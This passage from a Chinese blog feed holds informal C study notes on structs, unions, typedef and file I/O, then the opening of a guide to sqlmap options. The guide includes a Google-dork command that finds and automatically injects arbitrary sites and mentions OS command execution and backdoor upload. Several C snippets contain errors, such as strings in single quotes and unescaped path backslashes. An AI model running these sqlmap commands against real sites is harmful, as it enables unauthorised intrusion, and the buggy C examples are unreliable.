class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jiegouti.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;       </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">为什么需要结构体？</span></span><br><span class="line"><span class="comment">为了表示一些复杂的事物，而普通的数据类型无法满足实际需求</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">结构体：</span></span><br><span class="line"><span class="comment">把一些基本类型组合到一起，形成的一个新的符合数据类型</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">大小：</span></span><br><span class="line"><span class="comment">结构体：总大小一般情况下等于各成员大小之和(先不考虑内存对齐)</span></span><br><span class="line"><span class="comment">共用体：大小等于成员中最大的那个大小。（通常和结构体一起使用）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如何定义(推荐第一种)：</span></span><br><span class="line"><span class="comment">1. 推荐（这只是定义了一个新的数据类型，并没有定义变量）</span></span><br><span class="line"><span class="comment"> struct student&#123;</span></span><br><span class="line"><span class="comment">int num;</span></span><br><span class="line"><span class="comment">char name[20];</span></span><br><span class="line"><span class="comment">int age;</span></span><br><span class="line"><span class="comment"> &#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2. 这样只能定义一次</span></span><br><span class="line"><span class="comment"> struct student&#123;</span></span><br><span class="line"><span class="comment">int num;</span></span><br><span class="line"><span class="comment">char name[20];</span></span><br><span class="line"><span class="comment">int age;</span></span><br><span class="line"><span class="comment"> &#125; st1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 3. 类型都没写...</span></span><br><span class="line"><span class="comment"> struct &#123;</span></span><br><span class="line"><span class="comment">int num;</span></span><br><span class="line"><span class="comment">char name[20];</span></span><br><span class="line"><span class="comment">int age;</span></span><br><span class="line"><span class="comment"> &#125; st1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> //赋值和初始化(定义同时可以整体赋值,定义玩之后只能单个赋值)</span></span><br><span class="line"><span class="comment"> 定义同时初始化： struct student s1 = &#123;1,'xxx',18&#125;;</span></span><br><span class="line"><span class="comment"> 先定义，后赋值：</span></span><br><span class="line"><span class="comment">  struct student s2;</span></span><br><span class="line"><span class="comment">  s2.num=1;</span></span><br><span class="line"><span class="comment">  s2.name='yyy';</span></span><br><span class="line"><span class="comment">  s2.age=19;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> //取出结构体变量中每一个成员【重点】</span></span><br><span class="line"><span class="comment">1.结构体指针变量名.成员名</span></span><br><span class="line"><span class="comment">2.指针变量名-&gt;成员名    （第二种更常用）</span></span><br><span class="line"><span class="comment">struct student *p = &amp;s;  //注意是&amp;</span></span><br><span class="line"><span class="comment">p-&gt;name; //第一种方式(指针变量-&gt;成员变量名,在计算机内部会被转换为(*指针变量名).成员名)</span></span><br><span class="line"><span class="comment">(*p).name; //第二种方式，与 s.name; 等价</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//结构体变量的运算</span></span><br><span class="line"><span class="comment">结构体变量不能相加，相减，也不能相互乘除。</span></span><br><span class="line"><span class="comment">但结构体变量可以相互赋值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//结构体变量和结构体变量指针作为函数参数传递的问题</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//动态构造结构体数组</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//链表</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> gender;</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">float</span> score;</span><br><span class="line"><span class="keyword">char</span> addr[<span class="number">30</span>];</span><br><span class="line">&#125; ss=&#123;1,'xx','nan',20,99.9,'hhh'&#125;;   // ss就是变量 可以直接在这里初始化</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值和初始化</span></span><br><span class="line">struct student ss2 = &#123;2,'yy','bei',20,99.9,'zzz'&#125;;</span><br><span class="line">struct student s = &#123;100,'lala','M',20,99.5, 'beij'&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体数组</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">sArr</span>[3];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%s %c%d%f%s"</span>, &amp;sArr[i].num, sArr[i].name, &amp;sArr[i].gender, &amp;sArr[i].age,&amp;sArr[i].score, &amp;sArr[i].addr); <span class="comment">// %c 忽略空格</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体指针</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span> = &amp;<span class="title">s</span>;</span>  <span class="comment">//注意是&amp;</span></span><br><span class="line"><span class="comment">//p = &amp;s;</span></span><br><span class="line"><span class="comment">// 获取成员</span></span><br><span class="line"></span><br><span class="line">p-&gt;name; <span class="comment">//第一种方式(指针变量-&gt;成员变量名,在计算机内部会被转换为(*指针变量名).成员名)</span></span><br><span class="line">(*p).name; <span class="comment">//第二种方式，与 s.name; 等价</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// p-&gt;name的含义：p所指向的那个结构体变量中的name这个成员</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = p-&gt;num++;   <span class="comment">// num = p-&gt;num, num=p-&gt;num+1;   //优先级</span></span><br><span class="line"><span class="comment">// 第一时间去掉++</span></span><br><span class="line">num = p++-&gt;num;    <span class="comment">// 没问题, num=p-&gt;num,  p=p+1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//浮点型默认在C语言中是double，如果要定义成float，则在后面加f或F， 但是不能准确存储</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过函数完成对结构体变量的输入和输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">struc_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">InputStudent(&amp;st);  <span class="comment">//对结构体变量输入</span></span><br><span class="line">OutputStudent(st);  <span class="comment">//对结构体变量输出</span></span><br><span class="line">OutputStudent2(&amp;st);  <span class="comment">//对结构体变量输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputStudent</span><span class="params">(struct Student * pstu)</span> <span class="comment">//pstu只占4个字节</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">(*pstu).num=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(pstu-&gt;name, <span class="string">"xxx"</span>);  </span><br><span class="line">pstu-&gt;age=<span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  这是无法改变主函数的值的</span></span><br><span class="line"><span class="comment">void InputStudent(struct Student stu)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">stu.num=1;</span></span><br><span class="line"><span class="comment">strcpy(stu.name, "xxx");  </span></span><br><span class="line"><span class="comment">stu.age=18;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////应该发送内容还是传送地址？</span></span><br><span class="line"><span class="comment">//如果传递的是内容，内存消耗大</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputStudent</span><span class="params">(struct Student stu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, %s %d"</span>, stu.num,stu.name, stu.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果传递的是地址，可能不安全，但是提高了速度，节省了内存（推荐这种方法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputStudent2</span><span class="params">(struct Student *pstu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, %s %d"</span>, pstu-&gt;num,pstu-&gt;name, pstu-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">【指针优点大总结：】</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">快速的传递数据，较少了内存的消耗 【重点】</span></span><br><span class="line"><span class="comment">使函数返回一个以上的值  【重点】</span></span><br><span class="line"><span class="comment">能直接访问硬件</span></span><br><span class="line"><span class="comment">能方便的处理字符串</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//共用体</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_union</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//共用体：大小等于成员中最大的那个大小（通常和结构体一起使用）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// union 共用体name</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     成员表列</span></span><br><span class="line"><span class="comment">// &#125; 变量表列;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> data&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">float</span> f;</span><br><span class="line">&#125;u1;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 共用体的起始地址和每个成员的起始地址是相同的</span></span><br><span class="line"><span class="comment">// 一个时间内只能存取一个成员</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">union</span> data d; <span class="comment">// 现在最大的就是4</span></span><br><span class="line">d.i = <span class="number">4</span>;</span><br><span class="line">d.c=<span class="string">'A'</span>;</span><br><span class="line">d.f = <span class="number">99.9</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1) 为基本数据类型定义新的类型名</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> REAL;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">//2) 为自定义数据类型（结构体、共用体和枚举类型）定义简洁的类型名称</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPoint</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">    <span class="keyword">double</span> z;</span><br><span class="line">&#125; Point;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">实际上完成了两个操作：</span></span><br><span class="line"><span class="comment">1、定义了一个新的结构类型</span></span><br><span class="line"><span class="comment">struct tagPoint</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    double x;</span></span><br><span class="line"><span class="comment">    double y;</span></span><br><span class="line"><span class="comment">    double z;</span></span><br><span class="line"><span class="comment">&#125; ;</span></span><br><span class="line"><span class="comment">2、使用 typedef 为这个新的结构起了一个别名，叫 Point</span></span><br><span class="line"><span class="comment">typedef struct tagPoint Point</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3) 为数组定义简洁的类型名称</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span>* PCHAR;</span><br><span class="line">PCHAR pa</span><br></pre></td></tr></table></figure><h4 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">二进制全部为0的含义：  </span><br><span class="line">    1.数值为0</span><br><span class="line">    2.字符串结束标记符 &apos;\0&apos;</span><br><span class="line">    3.空指针NULL</span><br><span class="line">        NULL表示编号为0的地址</span><br><span class="line">        NULL表示的是零，不是数字，而是代表内存单元的编号</span><br><span class="line"></span><br><span class="line">        计算机规定了，以零为编号的存储单元的内存不可读、不可写</span><br></pre></td></tr></table></figure><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> N 20</span></span><br><span class="line"></span><br><span class="line">FILE *fp;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> p;</span><br><span class="line">    <span class="keyword">char</span> ret;</span><br><span class="line">    <span class="keyword">char</span> buf[N] = &#123;<span class="number">0</span>&#125;;   <span class="comment">// 先初始化</span></span><br><span class="line">    <span class="comment">// fp = fopen("file.txt", "r");</span></span><br><span class="line">    fp = fopen(<span class="string">"D:\Desktop\1.txt"</span>, <span class="string">"r+"</span>);    <span class="comment">// argv[1] 是传递的第一个参数</span></span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>)   <span class="comment">// 判断打开是否成功， -&gt; 失败</span></span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"fopen"</span>);   <span class="comment">// 定位函数执行错误原因（只能定位刚刚执行的）</span></span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// fgetc   读取，一次读取一个字节</span></span><br><span class="line">   <span class="keyword">while</span> ((c = fgetc(fp)) != EOF)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>,c);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// fputs   写入，一次写入一个字节</span></span><br><span class="line">    p = <span class="string">'H'</span>;</span><br><span class="line">    ret = fputc(p, fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// printf(FILE *fp,const char *format, ...) 函数来写把一个字符串写入到文件中</span></span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">"This is testing for fprintf...\n"</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// fread:      buf没有\0</span></span><br><span class="line">    ret = fread(buf, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), N, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d, %s \n"</span>, ret, buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fwrite:</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"word"</span>);</span><br><span class="line">    ret = fwrite(buf, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">strlen</span>(buf), fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空buffer</span></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fseek</span></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_SET);   <span class="comment">//  移动到开头。SEEK_SET,偏移量的起始点:文件开始处</span></span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">-12</span>, SEEK_CUR);   <span class="comment">// 往回偏移, 与磁盘上实际的字节数对应。SEEK_CUT:文件当前位置 </span></span><br><span class="line">    <span class="comment">// SEEK_END,偏移量的起始点：SEEK_END</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ftell      获取文件读写指针的当前位置</span></span><br><span class="line"><span class="keyword">long</span> last = ftell(fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fclose(fp);  </span><br><span class="line"></span><br><span class="line">    error:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error!!!"</span>);</span><br><span class="line">        <span class="comment">// fclose(fp);  // 关闭文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于好久时间不看C了，好多东西都忘了&lt;/p&gt;
&lt;p&gt;本文是跟着郝斌老师的视频做的随堂笔记，课下也没做整理，并不成系统，只是一些简单堆叠，且编码规范都没有，看看就好哈哈&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;字符串&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="C语言" scheme="http://www.xpshuai.cn/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="C语言" scheme="http://www.xpshuai.cn/tags/C%E8%AF%AD%E8%A8%80/"/>
    
      <category term="琐碎复习" scheme="http://www.xpshuai.cn/tags/%E7%90%90%E7%A2%8E%E5%A4%8D%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap参数简介</title>
    <link href="http://www.xpshuai.cn/sqlmap%E5%8F%82%E6%95%B0%E7%AE%80%E4%BB%8B/"/>
    <id>http://www.xpshuai.cn/sqlmap参数简介/</id>
    <published>2020-03-22T11:57:40.000Z</published>
    <updated>2020-04-26T12:46:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/sqlmap参数简介/sqlmap.png"></p><a id="more"></a><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul><li><p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener">官网</a></p></li><li><p>其他特性：</p><ol><li>数据库直接连接 <code>-d</code>, 不通过SQL注入，执行身份认证信息，ip，端口</li><li>与BurpSuite，Google结合使用，支持政策表但是限定测试目标</li><li>支持Basic, Digest, BTLM, CA 身份认证</li><li>db版本， 用户，权限，hash枚举和字典破解，暴力破解表列名称</li><li>文件上传下载，UDF， 启动并执行存储过程，操作系统命令执行，访问win注册表</li><li>与w3af， metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li></ol></li></ul><p><strong>升级:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 在线更新sqlmap</span><br><span class="line">sqlmap --update</span><br><span class="line"></span><br><span class="line"># 离线升级</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></p><p><strong>其他常识：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 结果文件夹位置</span><br><span class="line">/.root/sqlmap/output</span><br><span class="line"></span><br><span class="line"># 日志</span><br><span class="line">.sqlmap</span><br><span class="line">   </span><br><span class="line"># 配置文件  </span><br><span class="line">自己找</span><br></pre></td></tr></table></figure></p><h1 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h1><h4 id="1-Target"><a href="#1-Target" class="headerlink" title="1. Target"></a><font color="red">1. Target</font></h4><p>   <strong>Get方法：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-u url链接   # get链接</span><br><span class="line">-f # 检查DBMS的指纹信息</span><br><span class="line">-p user_name # 指定字段参数</span><br><span class="line">-m list.txt  # 扫描url列表文件</span><br><span class="line">-g  # google搜索,自动去google找到然后自动注入    \” 是转义引号，如下所示：</span><br><span class="line"><span class="meta">#</span><span class="bash"> 例如： sqlmap -g <span class="string">"inurl:\".php?id=1\"  </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 结果文件夹位置</span></span><br><span class="line">/.root/sqlmap/output</span><br><span class="line"></span><br><span class="line">-- users   # 有哪些user</span><br><span class="line">--banner  # banner 信息</span><br><span class="line">--dbs   # 有哪些库</span><br><span class="line">--schema   #元数据(查的是informatin_schema信息，前提是有权限)</span><br><span class="line">-a     # 所有的</span><br><span class="line">-d  “mysql://root:@192.168.20.10:3306/dvwa”    # 让sqlmap作为客户端链接数据库（dvwa是数据库名称）</span><br></pre></td></tr></table></figure><p>   <strong>Post方法：</strong><br>就不是通过url来扫描了，而是body来进行扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-r request.txt    # 使用http请求文件进行注入（burpsuite拦截的请求数据包复制保存到文件, 存在注入的位置用*标出）</span><br><span class="line">-l  log.txt       #  使用burpsuite log文件 （使用burpsuite:option-&gt; Misc -&gt;logging -&gt; 这里选择Proxy-&gt; 这里选择requests-&gt; 选择log文件保存位置 ）</span><br><span class="line">--force-ssl       #  支持Https，即听过https来进行请求，或在url域名后+443端口也可以</span><br><span class="line">-c  sqlmap.conf   #  扫描配置文件（把扫描配置写到里面，把它引用即可）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查找文件</span></span><br><span class="line">dpokg -L    # 找有关..的文件包</span><br><span class="line">dpokg -L sqlmap | grep sqlmap.conf</span><br></pre></td></tr></table></figure><h4 id="2-Request"><a href="#2-Request" class="headerlink" title="2. Request "></a><font color="red">2. Request </font></h4><p>post请求  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 